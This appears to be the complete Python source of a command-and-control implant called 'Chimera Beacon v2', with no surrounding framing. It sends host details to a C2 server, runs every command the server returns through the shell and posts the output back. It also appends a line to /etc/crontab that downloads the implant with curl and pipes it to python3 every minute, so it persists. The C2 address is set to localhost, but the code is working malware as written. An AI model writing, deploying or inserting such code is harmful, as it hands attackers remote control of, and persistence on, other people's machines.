#!/usr/bin/env python3
"""Chimera Beacon v2 — Calls home to C2, persists, awaits orders"""

import socket, hashlib, json, os, time, subprocess, sys, threading, base64, urllib.request, urllib.error

C2_HOST = "127.0.0.1"
C2_PORT = 10002
BEACON_URL = f"http://{C2_HOST}:{C2_PORT}/beacon"
RESULT_URL = f"http://{C2_HOST}:{C2_PORT}/result"
IMPLANT_URL = f"http://{C2_HOST}:{C2_PORT}/implant_v2.py"
BEACON_INTERVAL = 120

def get_id():
    try:
        h = hashlib.md5()
        h.update(socket.gethostname().encode())
        h.update(str(time.time()).encode())
        return h.hexdigest()[:16]
    except:
        return f"bot_{int(time.time())}"

def beacon(c2_url, bot_id, hostname, ip, arch):
    data = json.dumps({
        "bot_id": bot_id,
        "hostname": hostname,
        "ip": ip,
        "arch": arch,
        "type": "beacon",
        "platform": "python"
    }).encode()
    req = urllib.request.Request(c2_url, data=data, headers={"Content-Type": "application/json"})
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        body = resp.read().decode()
        return json.loads(body)
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except:
            return None
    except Exception:
        return None

def send_result(cmd_id, output, exit_code):
    data = json.dumps({"cmd_id": cmd_id, "output": output, "exit_code": exit_code}).encode()
    req = urllib.request.Request(RESULT_URL, data=data, headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=10)
    except:
        pass

def poll_forever():
    bot_id = get_id()
    try:
        hostname = socket.gethostname()
    except:
        hostname = "unknown"
    try:
        ip = socket.gethostbyname(hostname) if hostname != "unknown" else "0.0.0.0"
    except:
        ip = "0.0.0.0"
    try:
        arch = os.uname().machine
    except:
        arch = "unknown"

    while True:
        try:
            resp = beacon(BEACON_URL, bot_id, hostname, ip, arch)
            if resp and resp.get("type") == "cmd":
                for cmd in resp.get("commands", []):
                    cmd_id = cmd.get("cmd_id")
                    command = cmd.get("command", "")
                    if not cmd_id or not command:
                        continue
                    try:
                        result = subprocess.run(
                            command, shell=True, capture_output=True, timeout=60
                        )
                        output = (result.stdout.decode(errors="replace") + "\n" +
                                  result.stderr.decode(errors="replace")).strip()
                        send_result(cmd_id, output, result.returncode)
                    except subprocess.TimeoutExpired:
                        send_result(cmd_id, "TIMEOUT", -1)
                    except Exception as e:
                        send_result(cmd_id, str(e), -1)
            sleep_sec = resp.get("sleep", BEACON_INTERVAL) if resp else BEACON_INTERVAL
        except Exception:
            sleep_sec = BEACON_INTERVAL
        time.sleep(min(sleep_sec, 300))

def install_persist():
    """Install cron persistence"""
    try:
        cron_line = f"* * * * * curl -s {IMPLANT_URL} | python3 &\n"
        with open("/etc/crontab", "r") as f:
            if cron_line in f.read():
                return
    except:
        pass
    try:
        with open("/etc/crontab", "a") as f:
            f.write(cron_line)
    except:
        pass

if __name__ == "__main__":
    install_persist()
    poll_forever()
